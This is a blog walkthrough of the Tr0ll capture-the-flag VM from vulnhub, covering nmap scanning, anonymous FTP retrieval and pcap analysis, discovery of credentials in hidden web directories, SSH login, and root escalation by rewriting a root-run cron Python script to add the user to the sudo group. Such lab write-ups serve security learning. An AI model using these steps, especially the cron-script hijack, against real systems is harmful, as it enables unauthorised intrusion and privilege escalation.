---
layout: post
title: Walkthrough Tr0ll VM
date: 2016-04-12 02:22:43.000000000 -03:00
type: post
published: true
status: publish
categories: []
tags:
- CTR
- security
- vulnhub
- wargames
meta:
  _oembed_d049cc1fe9810e5f1e6612ac66fdb7b4: "{{unknown}}"
  _oembed_a5a6d47c02871c24c0644e59258c42e1: "{{unknown}}"
  _oembed_87dc03ad71d6dce2e571e96563c61d0d: "{{unknown}}"
  _rest_api_published: '1'
  _rest_api_client_id: "-1"
  _publicize_job_id: '21696128603'
author:
  login: tidlost
  email: tl.dr.mfw@gmail.com
  display_name: tidlost
  first_name: ''
  last_name: ''
---

This is a walkthrough of the VM Tr0ll. That can be found on [vulnhub.](https://www.vulnhub.com/entry/tr0ll-1,100/)
Let's fire up Virtualbox and boot up the VM.

## Mapping
Let's start by scanning the network to find our server.

```
nmap 192.168.1.0/24
```

```
Nmap scan report for 192.168.1.107
Host is up (0.0067s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```
I usually map the machine to a fake-domain address so that Burp Suite will work.

```
sudo vim /etc/hosts
192.168.1.107   troll.dev
```

Okay, so we have three ports showing, after an initial scan. Let's try all the ports. To make sure we are not missing anything.
The `A-`flag stands for aggressive. This flag is a combination of `-O` (OS-detection), `-sV` (version scanning), `-sC` (script scanning), and `--traceroute`.
`-p-` means that we will check all 65532 ports.

```
nmap -A -p- 192.168.1.107

#Output
Starting Nmap 7.00 ( https://nmap.org ) at 2016-04-11 21:02 CLST
Nmap scan report for troll.dev (192.168.1.107)
Host is up (0.0070s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxrwxrwx    1 1000     0            8068 Aug 10  2014 lol.pcap [NSE: writeable]
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 d6:18:d9:ef:75:d3:1c:29:be:14:b5:2b:18:54:a9:c0 (DSA)
|   2048 ee:8c:64:87:44:39:53:8c:24:fe:9d:39:a9:ad:ea:db (RSA)
|_  256 0e:66:e6:50:cf:56:3b:9c:67:8b:5f:56:ca:ae:6b:f4 (ECDSA)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
| http-robots.txt: 1 disallowed entry
|_/secret
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

### FTP
Okay, so we can see that the server is using vsftpd version 3.0.2. Vsftpd is the default ftp-server in many linux-systems. This configuration appears to allow anonymous logins. Which is why we are able to retrieve the file listing of the root directory just by scanning it. So we can see that there is a file called lol.pcap. We will get to this later.

### SSH
We can also see that port 22 is open, the standard port for SSH. The version seems to be 6.6.1p1, which is not the latest. Then we can see the host-key of ssh.

### HTTP
Okay so it seems port 80 is open. And it runs Apache 2.4.7, on Ubuntu.
It has a robots.txt file, which might be worth checking out.
Okay, so we have two interesting leads here. We have the file lol.pcap on the ftp-server, and we have port 80. So let's check out the web.
The index-page just gives us a troll-image. I download it and investigate the meta-data of the image. But I find nothing interesting.

```
wget http://troll.dev/hacker.jpg
exiftool hacker.jpg
```

Let's check out the robots file.

```
User-agent:*
Disallow: /secret
```

It leads us to secret. But that is just another troll image, and with no interesting meta-data.
## lol.pcap
We log in with the user anonymous and don't need to provide a password.

```
ftp 192.168.1.107
Connected to 192.168.1.107.
220 (vsFTPd 3.0.2)
Name (192.168.1.107:comp): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rwxrwxrwx    1 1000     0            8068 Aug 10  2014 lol.pcap
226 Directory send OK.
ftp> get lol.pcap
local: lol.pcap remote: lol.pcap
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for lol.pcap (8068 bytes).
226 Transfer complete.
8068 bytes received in 0.00 secs (92693.0 kB/s)
```

Okay. So now we have the .pcap file on the computer. But what is a pcap file?
Pcap stands for "Package Capture". Which means that it is a file filled with packages that has been captured and saved in the file. So we are able to analyze network packages after they have been sent. So in order to make any sense of this file we need a program to open it with. Wireshark is popular to use. But I don't have it on this computer, so instead I use tcpick. Tcpick is just like wireshark, a tcp stream sniffer.
We run the following command. C stands for color. -yP for viewing package in printable characters. and -r to read a file.

```
tcpick -C -yP -r lol.pcap
```

Here is the output:

```
tcpick: reading from lol.pcap
1      SYN-SENT       10.0.0.12:52449 > 10.0.0.6:ftp
1      SYN-RECEIVED   10.0.0.12:52449 > 10.0.0.6:ftp
1      ESTABLISHED    10.0.0.12:52449 > 10.0.0.6:ftp
220 (vsFTPd 3.0.2)
USER anonymous
331 Please specify the password.
PASS password
230 Login successful.
SYST
215 UNIX Type: L8
PORT 10,0,0,12,173,198
200 PORT command successful. Consider using PASV.
LIST
2      SYN-SENT       10.0.0.6:ftp-data > 10.0.0.12:44486
2      SYN-RECEIVED   10.0.0.6:ftp-data > 10.0.0.12:44486
2      ESTABLISHED    10.0.0.6:ftp-data > 10.0.0.12:44486
150 Here comes the directory listing.
-rw-r--r--    1 0        0             147 Aug 10 00:38 secret_stuff.txt
2      FIN-WAIT-1     10.0.0.6:ftp-data > 10.0.0.12:44486
2      FIN-WAIT-2     10.0.0.6:ftp-data > 10.0.0.12:44486
2      TIME-WAIT      10.0.0.6:ftp-data > 10.0.0.12:44486
2      CLOSED         10.0.0.6:ftp-data > 10.0.0.12:44486
226 Directory send OK.
TYPE I
200 Switching to Binary mode.
PORT 10,0,0,12,202,172
200 PORT command successful. Consider using PASV.
RETR secret_stuff.txt
3      SYN-SENT       10.0.0.6:ftp-data > 10.0.0.12:51884
3      SYN-RECEIVED   10.0.0.6:ftp-data > 10.0.0.12:51884
3      ESTABLISHED    10.0.0.6:ftp-data > 10.0.0.12:51884
150 Opening BINARY mode data connection for secret_stuff.txt (147 bytes).
Well, well, well, aren't you just a clever little devil, you almost found the sup3rs3cr3tdirlol :-P
Sucks, you were so close... gotta TRY HARDER!
3      FIN-WAIT-1     10.0.0.6:ftp-data > 10.0.0.12:51884
3      TIME-WAIT      10.0.0.6:ftp-data > 10.0.0.12:51884
3      CLOSED         10.0.0.6:ftp-data > 10.0.0.12:51884
226 Transfer complete.
TYPE A
200 Switching to ASCII mode.
PORT 10,0,0,12,172,74
200 PORT command successful. Consider using PASV.
LIST
4      SYN-SENT       10.0.0.6:ftp-data > 10.0.0.12:44106
4      SYN-RECEIVED   10.0.0.6:ftp-data > 10.0.0.12:44106
4      ESTABLISHED    10.0.0.6:ftp-data > 10.0.0.12:44106
150 Here comes the directory listing.
-rw-r--r--    1 0        0             147 Aug 10 00:38 secret_stuff.txt
4      FIN-WAIT-1     10.0.0.6:ftp-data > 10.0.0.12:44106
4      TIME-WAIT      10.0.0.6:ftp-data > 10.0.0.12:44106
4      CLOSED         10.0.0.6:ftp-data > 10.0.0.12:44106
226 Directory send OK.
QUIT
221 Goodbye.
1      FIN-WAIT-1     10.0.0.12:52449 > 10.0.0.6:ftp
1      TIME-WAIT      10.0.0.12:52449 > 10.0.0.6:ftp
1      CLOSED         10.0.0.12:52449 > 10.0.0.6:ftp
tcpick: done reading from lol.pcap
67 packets captured
4 tcp sessions detected
```

So we can see here that someone has logged in as anonymous.
And listed all the files in a directory, and it contains the mysterous file secret_stuff.txt.
It also contains a little message from our troll that talks about a supersecretdir.

```
-rw-r--r--    1 0        0             147 Aug 10 00:38 secret_stuff.txt
Well, well, well, aren't you just a clever little devil, you almost found the sup3rs3cr3tdirlol :-P
```

Okay, so a supersecret directory. Let's check it out in the browser.
Okay, is shows us a directory with a file called roflmao. Let's download it.

```
$ file roflmao
roflmao: ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=5e14420eaa59e599c2f508490483d959f3d2cf4f, not stripped
```

Okay. So it is an executable. Let's execute it then

```
chmod +x roflmao
./roflmao
#It returns
Find address 0x0856BF to proceed%
```
It looks like a hexadecimal value. But where to use it?
I convert it to decimals using python
```python
print int("0x0856BF", 16)
#Output:
546495

```

That number doesn't really say me anything.
Okay, so I try both decimal and hexadecimal numbers in the browser. http://troll.dev/0x0856BF/ leads me to a directory with a text of what I suppose is passwords.
http://troll.dev/0x0856BF/good_luck/which_one_lol.txt

```
maleus
ps-aux
felux
Eagle11
genphlux < -- Definitely not this one
usmc8892
blawrg
wytshadow
vis1t0r
overflow
```

It could be passwords, or usernames. In the other folder there is a dir called: his_folder_contains_the_password/ with the file Pass.txt in it.
I figure the next step must be ssh. So after trying many different combinations, which was made harder by the fact that the server has some kind of fail2ban mechanism installed, I figured the username was overflow and the password was Pass.txt.
Okay. So we get a shell, but it is a pretty crappy one so I just write bash and it gives me a bash-shell. Great!

## Enumeration and Privilege Escalation
Okay, so we have a shell and we are in. But after a few minutes we are kicked out. I guess there is a cronjob doing it.
Let's see what other users we have.

```
sudo -v
Sorry, user overflow may not run sudo on troll.
cat /etc/passwd
troll:x:1000:1000:Tr0ll,,,:/home/troll:/bin/bash
lololol:x:1001:1001::/home/lololol:
overflow:x:1002:1002::/home/overflow:
ps-aux:x:1003:1003::/home/ps-aux:
maleus:x:1004:1004::/home/maleus:
felux:x:1005:1005::/home/felux:
Eagle11:x:1006:1006::/home/Eagle11:
genphlux:x:1007:1007::/home/genphlux:
usmc8892:x:1008:1008::/home/usmc8892:
blawrg:x:1009:1009::/home/blawrg:
wytshadow:x:1010:1010::/home/wytshadow:
vis1t0r:x:1011:1011::/home/vis1t0r:
```

I have removed all users that are root and system-users. So we are left with 12 users. All part of their own groups.
I can't find out if any of them are sudo users because I don't have permission to view `/etc/sudoers`. We can also tell that the passwords are encrypted and in the shadow file, that we don't have access to.
Let's look

```
$ find / -writable -type d 2>/dev/null
/tmp
/run/user/1002
/run/shm
/run/lock
/var/tmp
/sys/fs/cgroup/systemd/user/1002.user/10.session
/proc/4981/task/4981/fd
/proc/4981/fd
/proc/4981/map_files
```

Let's see what in /var/tmp.

```
overflow@troll:/tmp$ cd /var/tmp
overflow@troll:/var/tmp$ ls
cleaner.py.swp
overflow@troll:/var/tmp$ cat cleaner.py.swp
crontab for cleaner.py successful
overflow@troll:/var/tmp$ find / -iname cleaner.py 2>/dev/null
/lib/log/cleaner.py
overflow@troll:/lib/log$ cat cleaner.py
#!/usr/bin/env python
import os
import sys
try:
	os.system('rm -r /tmp/* ')
except:
	sys.exit()
overflow@troll:/lib/log$
```

I ran a few other commands as well looking for setuid files. Those commands can be found on [this](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)  amazing page.
Okay, so we have a file that is owned by root and run as a cron every time I get kicked out. So maybe I can just make myself sudo.

```
import os
os.system("sudo usermod -aG sudo overflow")
```
Now I just wait for the cronjob to kick me out and run the code.
So I get kicked out and then I just run:
```
sudo su
```
And I am root.
